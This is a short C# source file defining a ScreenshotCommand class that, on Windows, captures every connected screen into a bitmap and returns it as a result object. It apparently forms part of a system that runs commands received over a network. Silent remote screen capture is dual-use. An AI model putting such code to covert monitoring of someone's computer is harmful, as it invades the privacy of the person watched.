﻿using NetworkMessage.CommandsResaults;
using System.Drawing;
using System.Runtime.InteropServices;

namespace NetworkMessage.Commands
{
    public class ScreenshotCommand : NetworkCommandBase
    {
        public override Task<INetworkCommandResult> Do(params object[] objects)
        {
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                int width = System.Windows.Forms.Screen.AllScreens.Sum(s => s.Bounds.Width);
                int height = System.Windows.Forms.Screen.AllScreens.Max(s => s.Bounds.Height);
                using Bitmap bitmap = new Bitmap(width, height);
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, new Size(width, height));
                }

                INetworkCommandResult screenshot = new ScreenshotResult(bitmap);
                return Task.FromResult(screenshot);
            }

            return default;
        }
    }
}